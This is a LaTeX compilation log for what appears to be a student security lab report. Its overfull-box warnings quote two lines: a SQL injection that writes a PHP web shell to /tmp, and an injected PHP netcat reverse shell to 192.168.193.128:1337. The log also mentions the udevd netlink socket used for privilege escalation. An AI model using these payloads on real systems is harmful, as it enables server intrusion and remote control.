This is pdfTeX, Version 3.14159265-2.6-1.40.21 (TeX Live 2020/Debian) (preloaded format=pdflatex 2021.4.5)  29 JUN 2022 23:04
entering extended mode
 restricted \write18 enabled.
 %&-line parsing enabled.
**Lab6-report.tex
(./Lab6-report.tex
LaTeX2e <2020-10-01> patch level 4
L3 programming layer <2021-01-09> xparse <2020-03-03>
(/usr/share/texlive/texmf-dist/tex/latex/base/article.cls
Document Class: article 2020/04/10 v1.4m Standard LaTeX document class
(/usr/share/texlive/texmf-dist/tex/latex/base/size10.clo
File: size10.clo 2020/04/10 v1.4m Standard LaTeX file (size option)
)
\c@part=\count177
\c@section=\count178
\c@subsection=\count179
\c@subsubsection=\count180
\c@paragraph=\count181
\c@subparagraph=\count182
\c@figure=\count183
\c@table=\count184
\abovecaptionskip=\skip47
\belowcaptionskip=\skip48
\bibindent=\dimen138
)
(/usr/share/texlive/texmf-dist/tex/latex/base/inputenc.sty
Package: inputenc 2020/08/01 v1.3d Input encoding file
\inpenc@prehook=\toks15
\inpenc@posthook=\toks16
)
(/usr/share/texlive/texmf-dist/tex/latex/graphics/graphicx.sty
Package: graphicx 2020/09/09 v1.2b Enhanced LaTeX Graphics (DPC,SPQR)

(/usr/share/texlive/texmf-dist/tex/latex/graphics/keyval.sty
Package: keyval 2014/10/28 v1.15 key=value parser (DPC)
\KV@toks@=\toks17
)
(/usr/share/texlive/texmf-dist/tex/latex/graphics/graphics.sty
Package: graphics 2020/08/30 v1.4c Standard LaTeX Graphics (DPC,SPQR)

(/usr/share/texlive/texmf-dist/tex/latex/graphics/trig.sty
Package: trig 2016/01/03 v1.10 sin cos tan (DPC)
)
(/usr/share/texlive/texmf-dist/tex/latex/graphics-cfg/graphics.cfg
File: graphics.cfg 2016/06/04 v1.11 sample graphics configuration
)
Package graphics Info: Driver file: pdftex.def on input line 105.

(/usr/share/texlive/texmf-dist/tex/latex/graphics-def/pdftex.def
File: pdftex.def 2020/10/05 v1.2a Graphics/color driver for pdftex
))
\Gin@req@height=\dimen139
\Gin@req@width=\dimen140
)
(/usr/share/texlive/texmf-dist/tex/latex/l3backend/l3backend-pdftex.def
File: l3backend-pdftex.def 2020-01-29 L3 backend support: PDF output (pdfTeX)
\l__color_backend_stack_int=\count185
\l__pdf_internal_box=\box47
)
(./Lab6-report.aux)
\openout1 = `Lab6-report.aux'.

LaTeX Font Info:    Checking defaults for OML/cmm/m/it on input line 8.
LaTeX Font Info:    ... okay on input line 8.
LaTeX Font Info:    Checking defaults for OMS/cmsy/m/n on input line 8.
LaTeX Font Info:    ... okay on input line 8.
LaTeX Font Info:    Checking defaults for OT1/cmr/m/n on input line 8.
LaTeX Font Info:    ... okay on input line 8.
LaTeX Font Info:    Checking defaults for T1/cmr/m/n on input line 8.
LaTeX Font Info:    ... okay on input line 8.
LaTeX Font Info:    Checking defaults for TS1/cmr/m/n on input line 8.
LaTeX Font Info:    ... okay on input line 8.
LaTeX Font Info:    Checking defaults for OMX/cmex/m/n on input line 8.
LaTeX Font Info:    ... okay on input line 8.
LaTeX Font Info:    Checking defaults for U/cmr/m/n on input line 8.
LaTeX Font Info:    ... okay on input line 8.

(/usr/share/texlive/texmf-dist/tex/context/base/mkii/supp-pdf.mkii
[Loading MPS to PDF converter (version 2006.09.02).]
\scratchcounter=\count186
\scratchdimen=\dimen141
\scratchbox=\box48
\nofMPsegments=\count187
\nofMParguments=\count188
\everyMPshowfont=\toks18
\MPscratchCnt=\count189
\MPscratchDim=\dimen142
\MPnumerator=\count190
\makeMPintoPDFobject=\count191
\everyMPtoPDFconversion=\toks19
) (/usr/share/texlive/texmf-dist/tex/latex/epstopdf-pkg/epstopdf-base.sty
Package: epstopdf-base 2020-01-24 v2.11 Base part for package epstopdf
Package epstopdf-base Info: Redefining graphics rule for `.eps' on input line 4
85.

(/usr/share/texlive/texmf-dist/tex/latex/latexconfig/epstopdf-sys.cfg
File: epstopdf-sys.cfg 2010/07/13 v1.3 Configuration of (r)epstopdf for TeX Liv
e
))
LaTeX Font Info:    External font `cmex10' loaded for size
(Font)              <12> on input line 10.
LaTeX Font Info:    External font `cmex10' loaded for size
(Font)              <8> on input line 10.
LaTeX Font Info:    External font `cmex10' loaded for size
(Font)              <6> on input line 10.

(./Lab6-report.toc)
\tf@toc=\write3
\openout3 = `Lab6-report.toc'.

 [1

{/var/lib/texmf/fonts/map/pdftex/updmap/pdftex.map}]
Underfull \hbox (badness 10000) in paragraph at lines 24--26

 []

<first.png, id=12, 624.3325pt x 373.395pt>
File: first.png Graphic file (type png)
<use first.png>
Package pdftex.def Info: first.png  used on input line 32.
(pdftex.def)             Requested size: 249.72858pt x 149.35535pt.
<sec.png, id=13, 502.87875pt x 609.27625pt>
File: sec.png Graphic file (type png)
<use sec.png>
Package pdftex.def Info: sec.png  used on input line 45.
(pdftex.def)             Requested size: 251.43875pt x 304.63737pt.
[2 <./first.png>] [3 <./sec.png>]
Overfull \hbox (122.24593pt too wide) in paragraph at lines 55--55
[]\OT1/cmtt/m/n/10 % or 0 = 0 union select 1, '<?php system($_GET['cmd']); ?>' 
into outfile '/tmp/exec.php'#[] 
 []


Overfull \hbox (69.74638pt too wide) in paragraph at lines 62--62
[]\OT1/cmtt/m/n/10 %' or 0=0 union select 1, '<?php system("nc 192.168.193.128 
1337 -e/bin/sh"); \[] 
 []

<pown.png, id=21, 300.12125pt x 36.135pt>
File: pown.png Graphic file (type png)
<use pown.png>
Package pdftex.def Info: pown.png  used on input line 64.
(pdftex.def)             Requested size: 150.06026pt x 18.06744pt.
<nc.png, id=22, 536.0025pt x 236.885pt>
File: nc.png Graphic file (type png)
<use nc.png>
Package pdftex.def Info: nc.png  used on input line 72.
(pdftex.def)             Requested size: 268.0006pt x 118.4422pt.
[4 <./pown.png> <./nc.png>]
Overfull \hbox (3.7784pt too wide) in paragraph at lines 81--84
\OT1/cmr/m/n/10 Following we look for the udevd netlink socket which is stores 
in proc/net/netlink. 
 []

<link.png, id=26, 558.085pt x 198.7425pt>
File: link.png Graphic file (type png)
<use link.png>
Package pdftex.def Info: link.png  used on input line 85.
(pdftex.def)             Requested size: 279.04182pt x 99.371pt.
<root.png, id=27, 218.8175pt x 85.31876pt>
File: root.png Graphic file (type png)
<use root.png>
Package pdftex.def Info: root.png  used on input line 89.
(pdftex.def)             Requested size: 109.40848pt x 42.65926pt.
[5 <./link.png> <./root.png>] (./Lab6-report.aux) ) 
Here is how much of TeX's memory you used:
 1278 strings out of 479304
 19430 string characters out of 5869780
 296139 words of memory out of 5000000
 18495 multiletter control sequences out of 15000+600000
 407845 words of font info for 42 fonts, out of 8000000 for 9000
 1141 hyphenation exceptions out of 8191
 68i,6n,74p,244b,191s stack positions out of 5000i,500n,10000p,200000b,80000s
</usr/share/texlive/texmf-di
st/fonts/type1/public/amsfonts/cm/cmbx12.pfb></usr/share/texlive/texmf-dist/fon
ts/type1/public/amsfonts/cm/cmbx9.pfb></usr/share/texlive/texmf-dist/fonts/type
1/public/amsfonts/cm/cmr10.pfb></usr/share/texlive/texmf-dist/fonts/type1/publi
c/amsfonts/cm/cmr12.pfb></usr/share/texlive/texmf-dist/fonts/type1/public/amsfo
nts/cm/cmr17.pfb></usr/share/texlive/texmf-dist/fonts/type1/public/amsfonts/cm/
cmr9.pfb></usr/share/texlive/texmf-dist/fonts/type1/public/amsfonts/cm/cmtt10.p
fb>
Output written on Lab6-report.pdf (5 pages, 239406 bytes).
PDF statistics:
 54 PDF objects out of 1000 (max. 8388607)
 33 compressed objects within 1 object stream
 0 named destinations out of 1000 (max. 500000)
 31 words of extra memory for PDF output out of 10000 (max. 10000000)

